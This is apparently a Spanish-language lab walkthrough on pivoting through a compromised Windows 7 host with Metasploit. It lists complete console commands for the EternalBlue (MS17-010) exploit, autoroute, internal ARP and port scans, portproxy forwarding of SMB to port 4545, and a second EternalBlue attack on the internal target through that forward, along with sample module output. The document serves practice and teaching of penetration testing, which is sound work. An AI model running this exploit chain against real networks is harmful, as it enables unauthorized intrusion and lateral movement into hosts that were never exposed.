# Pivoting en Windows usando Metasploit

![Laboratorio de pivoting en Windows](./Pivoting%20Windows.png)

En primer lugar, debemos ganar acceso a la máquina Windows 7 intermedia para luego hacer el pivoting al la máquina objetivo final que es otro Windows 7.

#### Reconocimiento

```bash
$ arp-scan -I eth0 --localnet --ignoredups
```

Identificamos la ip objetivo: `192.168.1.14`

En este punto, realizaríamos el escaneo con _nmap_ para encontrar los distintos puertos abiertos, vulnerabilidades, etc. En este caso, como es un laboratorio para practicar pivoting y conociendo que es un Windows 7 lo que esta corriendo en la máquina objetivo, utilizaremos el exploit _Eternal Blue_.

```bash
$ msfbd run
msf6> workspace -a PivotingWindows
msf6> use exploit/windows/smb/ms17_010_eternalblue
msf6> set RHOSTS 192.168.1.14
msf6> run
```

Enviamos a segundo plano la sesión de meterpreter y luego ejecutamos el modulo `post/multi/manage/autoroute` para realizar el enrutamiento del la red 20.20.20.0/24.

```bash
meterpreter > ifconfig -> listas las interfaces de red
meterpreter > CTRL + Z
msf6> use post/multi/manage/autoroute
msf6> set SESSION 1
msf6> run
```

Luego, ejecutamos el modulo `post/windows/gather/arp_scanner` para encontrar hosts activos dentro de la nueva red 20.20.20.0/24.

```bash
msf6> use post/windows/gather/arp_scanner
msf6> set RHOSTS 20.20.20.0/24
msf6> set SESSION 1
msf6> run
[*] Running module against WINDOWS
[*] ARP Scanning 20.20.20.0/24
[+]     IP: 20.20.20.1 MAC 52:54:00:12:35:00 (Realtek (UpTech? also reported))
[+]     IP: 20.20.20.4 MAC 08:00:27:af:83:db (CADMUS COMPUTER SYSTEMS)
[+]     IP: 20.20.20.3 MAC 08:00:27:5d:98:b2 (CADMUS COMPUTER SYSTEMS)
[+]     IP: 20.20.20.2 MAC 52:54:00:12:35:00 (Realtek (UpTech? also reported))
[+]     IP: 20.20.20.5 MAC 08:00:27:53:78:f2 (CADMUS COMPUTER SYSTEMS)
[+]     IP: 20.20.20.255 MAC 08:00:27:af:83:db (CADMUS COMPUTER SYSTEMS)
[*] Post module execution completed
```

Una vez identificado la máquina victima `20.20.20.5`, podemos utilizar el modulo `auxiliary/scanner/portscan/tcp` para descubrir los puertos abiertos en la máquina.

```bash
msf6> use auxiliary/scanner/portscan/tcp
msf6> set PORTS 1-1000
msf6> set RHOSTS 20.20.20.5
msf6> run
[+] 20.20.20.5: - 20.20.20.5:445 - TCP OPEN
```

Ahora que conocemos los puertos abiertos, podemos aplicar el port forwarding. Para lo cual, usamos el modulo `post/windows/manage/portproxy`

```bash
msf6> use post/windows/manage/portproxy
msf6> set CONNECT_ADDRESS 20.20.20.5
msf6> set CONNECT_PORT 445
msf6> set LOCAL_ADDRESS 0.0.0.0
msf6> set LOCAL_PORT 4545
msf6> set SESSION 1
msf6> run
```

#### Dirección 0.0.0.0

> **En el contexto de configuración de red (En un servidor o dispositivo):**
>
> Puede indicar que el dispositivo está configurado para escuchar en todas las interfaces de red disponibles. En otras palabras, significa "cualquier dirección" o "todas las interfaces". Por ejemplo, si un servidor está configurado para escuchar en la dirección IP 0.0.0.0, estará esperando conexiones en todas sus interfaces de red.

Con el modulo anterior, logramos redireccionar el puerto **445 (SMB)** de la máquina objetivo final (20.20.20.5) a el puerto **4545** de la máquina victima intermedia (20.20.20.4) para luego pode hacer el reconocimiento de versión y servicio.

```bash
msf6> db_nmap -sCV -p4545 192.168.1.14 -vvv
```

> Para ejecutar el comando anterior, debemos indicar la ip de la máquina intermedia en la interfaz a la cual tenemos acceso desde nuestra máquina atacante.

Por ultimo, para realizar el ataque a la máquina victima final ejecutamos otra instancia de metasploit y lanzamos nuevamente el exploit de **Eternal Blue**.

```bash
$ msfdb run
msf6> use exploit/windows/smb/ms17_010_eternalblue
msf6> set RHOSTS 192.168.1.14
msf6> set RPORT 4545 -> este es el puerto 445 de la máquina 20.20.20.5
msf6> set LPORT 5555
msf6> run
```
